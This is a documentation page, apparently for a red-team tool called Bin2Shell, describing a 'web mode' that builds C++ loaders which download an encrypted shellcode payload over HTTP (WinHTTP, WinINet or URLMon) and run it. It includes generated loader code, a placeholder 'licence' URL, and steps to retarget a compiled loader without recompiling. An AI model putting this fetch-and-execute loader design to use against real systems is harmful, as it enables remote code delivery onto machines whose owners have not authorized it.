# Web Mode & Security

## Web delivery mode

Bin2Shell's `-w / --web` flag separates the payload from the loader. The loader fetches the encoded payload at runtime over HTTP and runs the same envelope-decode → encoder-inverse pipeline you'd get with an inline build.

Web mode and [carriers](/bin2shell/carriers) are mutually exclusive — the carrier reads from disk, the web bundle fetches over the network.

### Output format

```yaml
cpp_includes: |
  #include <stdexcept>
  #include <string>
  #include <vector>
  #include <windows.h>
  #include <winhttp.h>
  #pragma comment(lib, "winhttp.lib")
cpp_declarations: |
  unsigned char chacha_key[] = { /* … */ };
  unsigned int  chacha_key_len = 32;
  // … etc
cpp_web_fetch: |
  static std::vector<unsigned char> bin2shell_fetch_payload_from_url(const std::string& url) { … }
  static std::string bin2shell_fetch_payload_text(const std::string& url) { … }
cpp_payload_init: |
  // URL fetch + length check
cpp_decode: |
  // Envelope decode + encoder inverse, wrapped in a lambda that produces
  // code_blob / code_blob_len at file scope
payload: "<encoded payload as text or hex>"
options:
  encoder: { index: 10, name: chacha20 }
  envelope: { index: 2, name: base64 }
  web: true
  web_helper: { index: 0, name: winhttp }
  payload_len: 512
  payload_checksum:
    algorithm: sha256
    value: "<sha256>"
```

The parser handles both the new format and the legacy single-section layout, and repairs C++ escape sequences that may be re-escaped during YAML serialisation.

### Web helper backends

Pick the HTTP transport with `-wh <N>` (`--web-helper`):

| Index | Name | Library | When to pick it |
|---|---|---|---|
| `0` | `winhttp` | `winhttp.lib` | Default; modern Windows, full TLS + proxy support |
| `1` | `wininet` | `wininet.lib` | Simpler, fewer LOC, uses IE settings |
| `2` | `urlmon` | `urlmon.lib` | Minimal — `URLOpenBlockingStreamA` is one call |

All three helpers expose the same two functions (`bin2shell_fetch_payload_from_url` and `bin2shell_fetch_payload_text`), so the rest of the generated code doesn't care which transport was picked.

### Generated loader behaviour

```cpp
// Set at build time — change to your hosting endpoint before deploying
static const std::string code_blob_payload_url = "http://localhost/licence";

static std::string code_blob_storage =
    bin2shell_fetch_payload_text(code_blob_payload_url);
const char* code_blob_text = code_blob_storage.c_str();

// Length is fetched at runtime, then sanity-checked against the build-time expected
static const unsigned int code_blob_text_expected_len = 512;
unsigned int code_blob_text_len = (unsigned int)code_blob_storage.size();

[[maybe_unused]] static const bool code_blob_text_len_check = []() {
    if (code_blob_text_len != code_blob_text_expected_len)
        throw std::runtime_error("Fetched payload length mismatch for code_blob_text");
    return true;
}();
```

The mismatch guard catches the common deployment mistake of forgetting to update the payload on the server while leaving the loader pointing at the old URL.

### Updating the URL

The embedded payload URL can be rewritten between build and ship, so a single compiled loader can be retargeted without recompiling. Open the generated `.cpp` file and update the `code_blob_payload_url` constant to point at your new endpoint before passing it to the compiler.

## Security and trust model

Algorithm catalogs and snippet definitions execute generation-time logic (Python) and emit compile-time code (C++). Both run inside processes you control — but they execute with whatever permissions the build process has, not the loader's.

::: danger Trust boundary
Only use Bin2Shell algorithm catalogs from trusted sources. A modified `algos.yaml` can:

- Execute arbitrary Python on the build machine via `python_snippet` / `keys_snippet`
- Inject arbitrary C++ into compiled loaders via `cpp_inverse` / `cpp_decode`
- Replace random keys with attacker-known constants while still appearing to call `gen_keys()`

Pin a known-good `algos.yaml` SHA in your build pipeline and refuse to build from any other catalog.
:::

Carriers (`bin2shell/carriers.py`) are defined in Python rather than YAML for the same reason: the build-time wrap and the runtime unwrap need to stay in lockstep, and reviewing code-as-code is easier than reviewing code-as-string-in-YAML.

## Verification workflow

```powershell
# 1. Verify all tools are present and version-compatible
washmachine-cli doctor

# 2. Verify the catalog loads
washmachine-cli show encoders
washmachine-cli show envelopes

# 3. Smoke-test a build
washmachine-cli encode -Shellcode payload.bin -Encoder 10 -Envelope 2

# 4. Run the full matrix
washmachine-cli test --shellcode payload.bin --phase 1
```

Inspect session logs at `logging/session_*/` for the rendered source code and compiler output.

::: warning ⚠️ Security Notice
This toolkit is intended **exclusively** for educational and authorized security testing purposes.
:::
